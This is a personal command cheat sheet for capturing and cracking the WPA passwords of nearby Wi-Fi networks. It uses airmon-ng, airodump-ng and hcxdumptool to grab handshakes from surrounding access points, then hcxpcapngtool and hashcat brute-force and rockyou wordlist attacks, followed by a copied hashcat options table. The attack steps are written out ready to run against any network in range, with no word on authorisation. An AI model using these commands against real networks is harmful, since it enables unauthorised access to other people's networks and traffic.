---------------------------------------------------------------------[hcxdumptool]--------------------------------------------------------------

	// Monitor mode
$ sudo airmon-ng check kill
$ sudo airmon-ng start wlan0

	// capture AP's nearby look for the channel a AP's is on
$ sudo airodump-ng wlan0mon

	// Once you know the channel and BSSID use.. -c for channel to capture everything on one channel

$ sudo airodump-ng wlan0mon -c 2

---------------------BEST-OPTION---------------------------------------------
	// stop network services
	// also stop wireless wpa services
	
$ sudo systemctl stop NetworkManager.service
$ sudo systemctl stop wpa_supplicant.service

$ sudo hcxdumptool -i wlan0 -o dumpfile.pcapng --active_beacon --enable_status=15

      // Let this run for a while...... capture as much info of nearby AP's>

$ ls  // to see the dumpfile.pcapng

      // Now we convert the pcapng file to a format that hashcat understands
      // We also use -E essidlist to get a file which contains essid's

$ hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng

	// now we can check and look inside our hash.hc22000 file using cat
	// then we can use hcxdumptool with a special parrameter to scan networks again
	// to figure out whats the mac address we are interested in.
	// if any of the mac addresses found in our handshake capture inside the file .hc22000
	// then using a special command will help us find the essid and mac of an assespoint

// with this command we scan again and match a bssid to a essid

$ sudo hcxdumptool --do_rcascan -i wlan0

[ Lets get to cracking with hashcat ]


- [ Attack Modes ] -

  # | Mode
 ===+======
  0 | Straight
  1 | Combination
  3 | Brute-force
  6 | Hybrid Wordlist + Mask
  7 | Hybrid Mask + Wordlist
  9 | Association

- [ Built-in Charsets ] -

 ? | Charset
 ===+=========
  l | abcdefghijklmnopqrstuvwxyz [a-z]
  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ [A-Z]
  d | 0123456789                 [0-9]
  h | 0123456789abcdef           [0-9a-f]
  H | 0123456789ABCDEF           [0-9A-F]
  s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
  a | ?l?u?d?s
  b | 0x00 - 0xff


$ hashcat -m 22000 hash.hc22000 -a 3 -i --increment-min 8 --increment-max 12 ?l?l?l?l?l?l?l?l?l?l?l?l

	// Word Lists

$ hashcat -m 22000 hash.hc22000 /home/kernelflood/Desktop/wordlist/rockyou.txt




[ This section is from the hashcat official website ]


- [ Options ] -

 Options Short / Long           | Type | Description                                          | Example
================================+======+======================================================+=======================
 -m, --hash-type                | Num  | Hash-type, references below (otherwise autodetect)   | -m 1000
 -a, --attack-mode              | Num  | Attack-mode, see references below                    | -a 3
 -V, --version                  |      | Print version                                        |
 -h, --help                     |      | Print help                                           |
     --quiet                    |      | Suppress output                                      |
     --hex-charset              |      | Assume charset is given in hex                       |
     --hex-salt                 |      | Assume salt is given in hex                          |
     --hex-wordlist             |      | Assume words in wordlist are given in hex            |
     --force                    |      | Ignore warnings                                      |
     --deprecated-check-disable |      | Enable deprecated plugins                            |
     --status                   |      | Enable automatic update of the status screen         |
     --status-json              |      | Enable JSON format for status output                 |
     --status-timer             | Num  | Sets seconds between status screen updates to X      | --status-timer=1
     --stdin-timeout-abort      | Num  | Abort if there is no input from stdin for X seconds  | --stdin-timeout-abort=300
     --machine-readable         |      | Display the status view in a machine-readable format |
     --keep-guessing            |      | Keep guessing the hash after it has been cracked     |
     --self-test-disable        |      | Disable self-test functionality on startup           |
     --loopback                 |      | Add new plains to induct directory                   |
     --markov-hcstat2           | File | Specify hcstat2 file to use                          | --markov-hcstat2=my.hcstat2
     --markov-disable           |      | Disables markov-chains, emulates classic brute-force |
     --markov-classic           |      | Enables classic markov-chains, no per-position       |
 -t, --markov-threshold         | Num  | Threshold X when to stop accepting new markov-chains | -t 50
     --runtime                  | Num  | Abort session after X seconds of runtime             | --runtime=10
     --session                  | Str  | Define specific session name                         | --session=mysession
     --restore                  |      | Restore session from --session                       |
     --restore-disable          |      | Do not write restore file                            |
     --restore-file-path        | File | Specific path to restore file                        | --restore-file-path=x.restore
 -o, --outfile                  | File | Define outfile for recovered hash                    | -o outfile.txt
     --outfile-format           | Str  | Outfile format to use, separated with commas         | --outfile-format=1,3
     --outfile-autohex-disable  |      | Disable the use of $HEX[] in output plains           |
     --outfile-check-timer      | Num  | Sets seconds between outfile checks to X             | --outfile-check=30
     --wordlist-autohex-disable |      | Disable the conversion of $HEX[] from the wordlist   |
 -p, --separator                | Char | Separator char for hashlists and outfile             | -p :
     --stdout                   |      | Do not crack a hash, instead print candidates only   |
     --show                     |      | Compare hashlist with potfile; show cracked hashes   |
